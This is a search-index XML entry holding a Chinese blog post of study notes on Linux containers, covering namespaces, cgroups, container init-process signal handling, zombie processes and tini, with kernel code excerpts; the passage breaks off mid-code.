<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>container-in-action</title>
      <link href="2022/04/07/container-in-action/"/>
      <url>2022/04/07/container-in-action/</url>
      
        <content type="html"><![CDATA[<h2 id="01-认识容器">01 | 认识容器</h2><h3 id="容器是什么？">容器是什么？</h3><ul><li><p>如果问 Linux 上的容器是什么，最简单直接的回答就是 Namesapce 和 Cgroups</p></li><li><p>Namespace 和 Cgroups 可以让程序在一个资源可控的独立（隔离）环境中运行，这个就是容器</p></li><li><p>容器的进程、网络还有文件系统都是独立的</p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220417-container-example.png" style="zoom: 20%;"></li></ul><h3 id="Namespace">Namespace</h3><ul><li><p>Linux Namespace 是一种 Linux Kernel 提供的<strong>资源隔离</strong>方案</p><blockquote><p><em>Linux namespace provides a lightweight process virtualization</em></p></blockquote><ul><li>系统可以为进程分配不同的 Namespace</li><li>并保证不同的 Namespace 资源独立分配、进程彼此隔离，即不同的 Namespace 下的进程互不干扰</li><li>可以隔离运行在同一个宿主机上的容器，让这些容器之间不能访问彼此的资源</li><li>隔离的作用：可以充分地利用系统的资源并保证了安全性</li></ul></li><li><p>Linux 对Namespace 操作方法</p><ul><li>clone：在创建新进程的系统调用时，可以通过 flags 参数指定需要新建的 Namespace 类型</li><li>setns：该系统调用可以让调用进程加入某个已经存在的 Namespace</li><li>unshare：该系统调用可以将调用进程移动到新的 Namespace</li></ul></li><li><p><em>There are 8 types of namespaces, standing for different types of resources</em></p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220417-8namespaces.png" style="zoom: 20%;"><ul><li><p>PID Namespace 负责隔离不同容器的进程</p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220421-pid-namespace.jpg" style="zoom: 20%;"></li><li><p>Network Namespace 中都有一套独立的网络接口，还有独立的 TCP/IP 的协议栈配置</p></li><li><p>Mount Namespace 保证每个容器都有自己独立的文件目录结构</p></li></ul></li><li><p>Linux 内核代码（4.9.229）中 Namespace 的实现</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">task_struct</span> <span class="token punctuation">{</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token comment">/* namespaces */</span><span class="token keyword">struct</span> <span class="token class-name">nsproxy</span> <span class="token operator">*</span>nsproxy<span class="token punctuation">;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span><span class="token keyword">struct</span> <span class="token class-name">nsproxy</span> <span class="token punctuation">{</span>atomic_t count<span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">uts_namespace</span> <span class="token operator">*</span>uts_ns<span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">ipc_namespace</span> <span class="token operator">*</span>ipc_ns<span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">mnt_namespace</span> <span class="token operator">*</span>mnt_ns<span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">pid_namespace</span> <span class="token operator">*</span>pid_ns_for_children<span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">net</span>      <span class="token operator">*</span>net_ns<span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">cgroup_namespace</span> <span class="token operator">*</span>cgroup_ns<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h3 id="Cgroups">Cgroups</h3><ul><li><p>Cgroups（Control Groups）是 Linux 下用于对一个或一组进程进行<strong>资源控制和监视</strong>的机制</p><ul><li><p>Cgroups 可以对指定的进程做各种计算机资源（诸如 CPU 使用时间、内存、磁盘I/O 等）的限制</p></li><li><p>不同资源的具体管理工作由相应的 Cgroup 子系统（Subsystem）来实现，针对不同类型的资源限制，只要将限制策略在不同的的子系统上进行关联即可</p></li><li><p>每个子系统限制资源的方式都是类似的：把相关的一组进程分配到一个控制组里，每个控制组都设有自己的资源控制参数</p><ul><li>启动的每个容器都会在 Cgroups 子系统下建立一个目录（控制组）</li><li>容器中所有的进程都会储存在控制组中 <code>cgroup.procs</code> 参数中</li></ul></li><li><p>Cgroups 以<strong>层级树</strong>（Hierarchy）的方式来组织管理控制组</p><ul><li>每个 Cgroup 都可以包含其他的子 Cgroup，因此子 Cgroup 能使用的资源除了受本 Cgroup 配置的资源参数限制，还受到父 Cgroup 设置的资源限制</li></ul></li></ul></li><li><p>Cgroups实现了对资源的配额和度量</p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220421-cgroups-subsys.png" style="zoom:90%;"><ul><li>CPU 子系统：用来限制一个控制组可使用的最大 CPU</li><li>memory 子系统：用来限制一个控制组最大的内存使用量</li><li>pids 子系统：用来限制一个控制组里最多可以运行多少个进程</li><li>cpuset 子系统：一个控制组里的进程与 CPU 做绑定</li></ul></li><li><p>Cgroups 有两个版本</p><ul><li>Cgroups v1<ul><li>各种子系统比较独立，每个进程在各个 Cgroups 子系统中独立配置，可以属于不同的 group</li><li>存在问题：会导致对同一进程的资源协调比较困难（比如 memory Cgroup 与 blkio Cgroup 之间就不能协作）</li></ul></li><li>Cgroups v2<ul><li>解决了 v1 的问题，使各个子系统可以协调统一地管理资源</li><li>但该版本很多子系统的实现需要较新版本的 Linux 内核</li></ul></li></ul></li><li><p>Linux 内核代码（4.9.229）中 Cgroups 的实现</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">task_struct</span> <span class="token punctuation">{</span> <span class="token comment">// 进程数据结构</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">CONFIG_CGROUPS</span></span><span class="token comment">/* Control Group info protected by css_set_lock */</span><span class="token keyword">struct</span> <span class="token class-name">css_set</span> __rcu <span class="token operator">*</span>cgroups<span class="token punctuation">;</span><span class="token comment">/* cg_list protected by css_set_lock and tsk-&gt;alloc_lock */</span><span class="token keyword">struct</span> <span class="token class-name">list_head</span> cg_list<span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span><span class="token comment">// css_set 是 cgroup_subsys_state 对象的集合数据结构</span><span class="token keyword">struct</span> <span class="token class-name">task_struct</span> <span class="token punctuation">{</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token comment">/* * Set of subsystem states, one for each subsystem. This array is * immutable after creation apart from the init_css_set during * subsystem registration (at boot time). */</span><span class="token keyword">struct</span> <span class="token class-name">cgroup_subsys_state</span> <span class="token operator">*</span>subsys<span class="token punctuation">[</span>CGROUP_SUBSYS_COUNT<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h2 id="02-容器进程">02 | 容器进程</h2><h3 id="理解进程">理解进程</h3><h4 id="为什么在容器中不能-kill-1号进程？">为什么在容器中不能 kill 1号进程？</h4><blockquote><p><strong>问题</strong>：怎么让 Kubernetes 节点上的容器从内部触发重启？</p><p>在容器中使用 kill pid 1 的方式让容器退出，Kubernetes 自动地把容器带回来？</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220421-docker-kill-1.png" alt=""></p><p>（错误，因为对于发送给 1 号进程的信号，内核会根据不同的类型、不同的注册状态，采取不同的处理方式）</p></blockquote><h5 id="init-进程">init 进程</h5><ul><li><p>在内核完成了操作系统的各种初始化之后，需要执行的第一个用户态程就是 init 进程，在内核中调用 1 号进程的代码，从内核态切换到用户态，所以 1 号进程是第一个用户态的进程</p></li><li><p>Linux init 进程最<strong>基本功能</strong>都是创建出 Linux 系统中其他所有的进程，并且管理这些进程</p></li><li><p><code>Systemd</code> 是目前最流行的 Linux init 进程，在它之前还有 SysVinit、UpStart 等 Linux init 进程（目前主流的 Linux 发行版都会把 <code>/sbin/init</code> 作为符号链接指向 Systemd ）</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220422-systemd.png" alt=""></p></li><li><p>具体在 kernel 里的代码实现如下：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">int</span> __ref <span class="token function">kernel_init</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>unused<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token comment">/* * We try each of these until one succeeds. */</span><span class="token keyword">if</span> <span class="token punctuation">(</span>execute_command<span class="token punctuation">)</span> <span class="token punctuation">{</span>ret <span class="token operator">=</span> <span class="token function">run_init_process</span><span class="token punctuation">(</span>execute_command<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>ret<span class="token punctuation">)</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token function">panic</span><span class="token punctuation">(</span><span class="token string">"Requested init %s failed (error %d)."</span><span class="token punctuation">,</span>      execute_command<span class="token punctuation">,</span> ret<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">try_to_run_init_process</span><span class="token punctuation">(</span><span class="token string">"/sbin/init"</span><span class="token punctuation">)</span> <span class="token operator">||</span>    <span class="token operator">!</span><span class="token function">try_to_run_init_process</span><span class="token punctuation">(</span><span class="token string">"/etc/init"</span><span class="token punctuation">)</span> <span class="token operator">||</span>    <span class="token operator">!</span><span class="token function">try_to_run_init_process</span><span class="token punctuation">(</span><span class="token string">"/bin/init"</span><span class="token punctuation">)</span> <span class="token operator">||</span>    <span class="token operator">!</span><span class="token function">try_to_run_init_process</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>一旦容器建立了自己的 Pid Namespace，这个 Namespace 里的进程号是从 1 开始标记的，容器的 init 进程也被称为 1 号进程，由它直接或者间接创建了 Namespace 中的其他进程</p></li></ul><h5 id="Linux-信号">Linux 信号</h5><ul><li><p>信号（Signal）是 Linux 进程收到的一个通知，实际是<strong>软中断</strong></p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220422-signal.png" alt=""></p><ul><li>信号为 Linux 提供了一种处理异步事件的方法</li><li>名字都以"SIG"开头，信号定义在<code>signal.h</code>头文件中，从1开始编号</li><li>新增了 32-64 可靠信号<ul><li>不可靠信号：信号可能丢失，进程并不能知道信号已丢失</li><li>可靠信号：即阻塞信号，当发送了一个阻塞信号，并且该信号的动作是系统默认动作或捕捉该信号，信号从发出以后会一直保持未决的状态，直到该进程对此信号解除了阻塞，或将对此信号的动作更改为忽略</li><li>信号的阻塞和未决是通过信号的<strong>状态字</strong>来管理的，状态字按位来管理信号的状态，一个 bit 代表一个信号</li><li>信号阻塞状态字（<code>block</code>），1 代表阻塞，0 代表不阻塞；信号未决状态字（<code>pending</code>），1 代表未决，0 代表信号可以抵达</li></ul></li></ul></li><li><p>进程对信号的处理</p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220422-signal-processing.png" style="zoom: 30%;"><ul><li>SIGTERM（15），这个信号是 Linux 命令 kill 缺省发出，SIGTERM 这个信号是可以被捕获的，用户进程可以为这个信号注册自己的 handler</li><li>SIGKILL (9)，是 Linux 里两个<strong>特权信号</strong>之一，进程收到 SIGKILL 就要退出<ul><li><strong>特权信号就是 Linux 为 kernel 和超级用户去删除任意进程所保留的，不能被忽略也不能被捕获</strong></li><li>但是 D state (uninterruptible) 进程 还有 Zombie 进程都是不能接受任何信号的</li></ul></li></ul></li><li><p>运行 kill 命令，其实在 Linux 里就是发送一个信号</p></li><li><p>信号处理函数的注册</p><ul><li><p>signal</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;signal.h&gt;</span></span><span class="token comment">// 真实处理信号函数</span><span class="token comment">// 指向返回值为 void 参数为 int 的函数指针</span><span class="token keyword">typedef</span> <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>sighandler_t<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 注册函数</span>sighandler_t <span class="token function">signal</span><span class="token punctuation">(</span><span class="token keyword">int</span> signum<span class="token punctuation">,</span> sighandler_t handler<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// signum:信号的编号 handler:中断函数的指针</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>当一个进程调动了 fork 函数，那么子进程会继承父进程的信号处理方式</li></ul></li><li><p>sigaction：信号传递的过程中携带数据</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;signal.h&gt;</span></span><span class="token keyword">int</span> <span class="token function">sigaction</span><span class="token punctuation">(</span><span class="token keyword">int</span> signum<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">sigaction</span> <span class="token operator">*</span>act<span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">sigaction</span> <span class="token operator">*</span>oldact<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">sigaction</span> <span class="token punctuation">{</span>   <span class="token keyword">void</span>       <span class="token punctuation">(</span><span class="token operator">*</span>sa_handler<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//信号处理程序，不接受额外数据，SIG_IGN 为忽略，SIG_DFL 为默认动作</span>   <span class="token keyword">void</span>       <span class="token punctuation">(</span><span class="token operator">*</span>sa_sigaction<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">,</span> siginfo_t <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//信号处理程序，能够接受额外数据和sigqueue配合使用</span>   sigset_t   sa_mask<span class="token punctuation">;</span><span class="token comment">//阻塞关键字的信号集，可以再调用捕捉函数之前，把信号添加到信号阻塞字，信号捕捉函数返回之前恢复为原先的值。</span>   <span class="token keyword">int</span>        sa_flags<span class="token punctuation">;</span><span class="token comment">//影响信号的行为SA_SIGINFO表示能够接受数据</span> <span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token comment">//回调函数句柄sa_handler、sa_sigaction只能任选其一</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul></li></ul><p>​</p><p>​</p><h5 id="现象解释">现象解释</h5><ul><li><p>在 Linux 里 kill 命令调用了 <code>kill()</code> 的这个系统调用而进入到了内核函数 <code>sys_kill()</code>，而内核在决定把信号发送给 1 号进程的时候，会调用 <code>sig_task_ignored()</code> 这个函数来做个判断，决定内核在哪些情况下会把发送的这个信号给忽略掉</p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220422-sig_task_ignored.png" style="zoom:25%;"><blockquote><p>内核为什么要忽略信号呢？</p><p>如果1号进程被杀，整个系统处于混乱并且难调试的状态，要尽量的避免这种情况</p></blockquote></li><li><p><code>sig_task_ignored()</code> 内核函数的实现</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">sig_task_ignored</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">task_struct</span> <span class="token operator">*</span>t<span class="token punctuation">,</span> <span class="token keyword">int</span> sig<span class="token punctuation">,</span> bool force<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">void</span> __user <span class="token operator">*</span>handler<span class="token punctuation">;</span>handler <span class="token operator">=</span> <span class="token function">sig_handler</span><span class="token punctuation">(</span>t<span class="token punctuation">,</span> sig<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/* SIGKILL and SIGSTOP may not be sent to the global init */</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">unlikely</span><span class="token punctuation">(</span><span class="token function">is_global_init</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">sig_kernel_only</span><span class="token punctuation">(</span>sig<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">return</span> true<span class="token punctuation">;</span>    <span class="token comment">// 条件满足则不发送信号</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">unlikely</span><span class="token punctuation">(</span>t<span class="token operator">-&gt;</span>signal<span class="token operator">-&gt;</span>flags <span class="token operator">&amp;</span> SIGNAL_UNKILLABLE<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>    handler <span class="token operator">==</span> SIG_DFL <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token punctuation">(</span>force <span class="token operator">&amp;&amp;</span> <span class="token function">sig_kernel_only</span><span class="token punctuation">(</span>sig<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token comment">// if(unlikely(value)) 等价于 if(value)</span>        <span class="token comment">// 进程必须是 SIGNAL_UNKILLABLE</span>        <span class="token comment">// SIG_DFL 是缺省的 handler</span><span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token comment">/* Only allow kernel generated signals to this kthread */</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">unlikely</span><span class="token punctuation">(</span><span class="token punctuation">(</span>t<span class="token operator">-&gt;</span>flags <span class="token operator">&amp;</span> PF_KTHREAD<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>     <span class="token punctuation">(</span>handler <span class="token operator">==</span> SIG_KTHREAD_KERNEL<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>force<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">return</span> true<span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token function">sig_handler_ignored</span><span class="token punctuation">(</span>handler<span class="token punctuation">,</span> sig<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p>force 由发送信号的进程和接受信号进程是否在同一个namespace里决定，force 对于同一个 Namespace 里发出的信号来说，调用值是 0，这个条件总是满足的</p></li><li><p>每个 Namespace 的 init 进程建立的时候就会打上<code>SIGNAL_UNKILLABLE</code>标签，这个条</p><p>件也是满足的</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220422-SIGNALUNKILLABLE-flag.png" alt=""></p></li><li><p>关键点：<code>handler == SIG_DFL</code></p></li></ul></li><li><p>内核针对每个 Nnamespace 里的 init 进程，<strong>把只有 default handler 的信号都给忽略了</strong>，如果自己注册了信号的 handler，那么这个信号 handler 就不再是 SIG_DFL，进程可以退出</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220422-init-sig.png" alt=""></p><blockquote><p>如果有一个 init 进程，它没有注册任何信号的 handler，如果我们从 <strong>Host Namespace</strong> 向它发送 SIGTERM 会发生什么情况呢？（不会，因为SIGTERM不是内核信号，只响应kill -9）</p></blockquote></li><li><p>SIGKILL 是一个特例，因为 SIGKILL 是不允许被注册用户 handler 的（还有一个不允许注册用户 handler 的信号是 SIGSTOP），所以 init 进程是不能被 SIGKILL 所杀，但是可以被 SIGTERM 杀死</p></li></ul><h5 id="总结">总结</h5><ol><li><p>内核阻止了容器中 1 号进程对 SIGKILL 和 SIGSTOP 两个特权信号的响应，所以 kill -9 1 在容器中不工作</p></li><li><p>对于其他的信号，如果用户自己注册了 handler，1 号进程可以响应</p></li></ol><h4 id="为什么我的容器里有这么多僵尸进程？">为什么我的容器里有这么多僵尸进程？</h4><blockquote><p><strong>问题</strong>：容器运行久了之后，运行 ps 命令会发现有很多的僵尸进程</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220422-zombie.png" alt=""></p><p>什么是僵尸进程？它们是怎么产生的？僵尸进程太多会导致什么问题？</p></blockquote><h5 id="Linux-进程状态">Linux 进程状态</h5><ul><li><p>无论进程还是线程，在 Linux 内核里其实都是用 <code>task_struct</code> 这个结构来表示，它是 Linux 里基本的调度单位</p></li><li><p>Linux 的进程一共7种状态，定义在<a href="https://github.com/torvalds/linux/blob/b6da0076bab5a12afb19312ffee41c95490af2a0/fs/proc/array.c">fs/proc/array.c</a></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span> <span class="token keyword">const</span> task_state_array<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"R (running)"</span><span class="token punctuation">,</span><span class="token comment">/*   0 */</span><span class="token string">"S (sleeping)"</span><span class="token punctuation">,</span><span class="token comment">/*   1 */</span><span class="token string">"D (disk sleep)"</span><span class="token punctuation">,</span><span class="token comment">/*   2 */</span><span class="token string">"T (stopped)"</span><span class="token punctuation">,</span><span class="token comment">/*   4 */</span><span class="token string">"t (tracing stop)"</span><span class="token punctuation">,</span><span class="token comment">/*   8 */</span><span class="token string">"X (dead)"</span><span class="token punctuation">,</span><span class="token comment">/*  16 */</span><span class="token string">"Z (zombie)"</span><span class="token punctuation">,</span><span class="token comment">/*  32 */</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>Linux 进程状态转化</p></li></ul>  <img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220423-process-state.png" style="zoom: 70%;"><ul><li>在进程“活着”的时候就只有两个状态：运行态（TASK_RUNNING）和睡眠态（TASK_INTERRUPTIBLE，TASK_UNINTERRUPTIBLE）<ul><li>运行态：进程正在运行中或者进程在 run queue 队列里随时可以运行</li><li>睡眠态：进程需要等待某个资源而进入的状态，这个状态的进程会被放入到 wait queue 队列里</li><li>睡眠态具体还包括两个子状态：<ul><li>可以被打断的（TASK_INTERRUPTIBLE）</li><li>不可被打断的（TASK_UNINTERRUPTIBLE）</li></ul></li></ul></li><li>进程在调用 do_exit() 退出的时候，还有两个状态<ul><li>EXIT_DEAD，进程在真正结束退出的那一瞬间的状态</li><li>EXIT_ZOMBIE 状态，这是进程在 EXIT_DEAD 前的一个状态（僵尸进程处于这个状态中），是不可被调度的进程</li><li>Linux 进程退出状态中 task_struct 里的 mm/shm/sem/files 等文件资源都已经释放，只留下一个 stask_struct instance 空壳，且不响应任何的信号了</li></ul></li></ul><h5 id="限制容器中进程数目">限制容器中进程数目</h5><ul><li><p>一台 Linux 机器上的进程总数目是有限制的，最大值可以在 <code>/proc/sys/kernel/pid_max</code> 参数中看到，Linux 内核在初始化系统的时候，会根据机器 CPU 的数目来设置 pid_max 的值</p></li><li><p>对于 Linux 系统而言，<strong>容器就是一组进程的集合</strong>，如果容器中的应用创建过多的进程或者出现 bug，就会产生类似 <code>fork bomb</code> 的行为，容器中的进程数把整个节点的可用进程总数消耗完，会让宿主机本身也无法工作，所以对每个容器都需要限制它的最大进程数（功能由 pids Cgroup 子系统来完成）</p></li><li><p>pids Cgroup 的 Cgroup 文件系统挂载点在<code>/sys/fs/cgroup/pids</code>，可以向控制组中的 <code>pids.max</code> 文件写入数值，而这个值就是这个容器中允许的最大进程数目</p></li></ul><h5 id="解决问题">解决问题</h5><ul><li><p>多个容器运行在同一个宿主机上的时候会配置 pids Cgroup 来限制每个容器的最大进程数目，但残留的僵尸进程在容器里仍然占据着进程号资源，很有可能会导致新的进程不能运转</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220424-zombie-proc.png" alt=""></p></li><li><p>子进程变成僵尸进程的原因：子进程退出的时候会给父进程发送信号，如果父进程不处理这个信号就会变成僵尸进程</p></li><li><p>进程退出后如果进入僵尸状态，父进程（init 进程）调用<code>wait()</code> 系统调用回收僵尸进程的最后系统资源，比如进程号资源</p></li><li><p><code>wait()</code> 系统调用是一个阻塞的调用，如果没有子进程是僵尸进程，整个进程就会被阻塞，Linux 还提供了一个类似的系统调<code>waitpid()</code>，其中有一个参数 WNOHANG：如果在调用的时候没有僵尸进程，那么函数马上返回</p><blockquote><p>如果容器的 init 进程创建了子进程 B，B 又创建了自己的子进程 C，如果 C 运行完之后退出成了僵尸进程，B 进程还在运行，而容器的 init 进程还在不断调用 waitpid()，那 C 这个僵尸进程可以被回收吗？</p><p>不会，<strong>waitpid 仅等待直接 children 的状态变化</strong>，</p></blockquote></li><li><p>比如社区的一个容器 init 项目 <code>tini</code>，它的主进程里就是不断在调用带 WNOHANG 参数的 <code>waitpid()</code> 来清理容器中所有的僵尸进程</p><ul><li>docker 启动容器的时候加 <code>--init</code> 参数，容器强制使用 tini 作为 init 进程</li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">reap_zombies</span><span class="token punctuation">(</span><span class="token keyword">const</span> pid_t child_pid<span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token operator">*</span> <span class="token keyword">const</span> child_exitcode_ptr<span class="token punctuation">)</span> <span class="token punctuation">{</span>pid_t current_pid<span class="token punctuation">;</span><span class="token keyword">int</span> current_status<span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>current_pid <span class="token operator">=</span> <span class="token function">waitpid</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>current_status<span class="token punctuation">,</span> WNOHANG<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">switch</span> <span class="token punctuation">(</span>current_pid<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">case</span> <span class="token operator">-</span><span class="token number">1</span><span class="token operator">:</span><span class="token keyword">if</span> <span class="token punctuation">(</span>errno <span class="token operator">==</span> ECHILD<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token function">PRINT_TRACE</span><span class="token punctuation">(</span><span class="token string">"No child to wait"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h4 id="为什么我在容器中的进程被强制杀死了？">为什么我在容器中的进程被强制杀死了？</h4><blockquote><p><strong>问题</strong>：在容器平台上想要停止一个容器最后都会用到 Containerd 这个服务，而 Containerd 在停止容器的时候，就会向容器的 init 进程发送一个 SIGTERM 信号，在 init 进程退出之后，容器内的其他进程也会退出，但是收到的是 SIGKILL 信号，没机会执行清理工作，而一旦进程不能 graceful shutdown，就会增加应用的出错率</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220427-shutdown.png" alt=""></p></blockquote><h5 id="信号的两个系统调用">信号的两个系统调用</h5><ul><li><p>kill() 系统调用</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h&gt;</span> </span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;signal.h&gt;</span> </span><span class="token keyword">int</span> <span class="token function">kill</span><span class="token punctuation">(</span>pid_t pid<span class="token punctuation">,</span> <span class="token keyword">int</span> sig<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ul><li>sig：代表需要发送哪个信号</li><li>pid：信号需要发送给哪个进程</li></ul></li><li><p>signal() 系统调用</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token 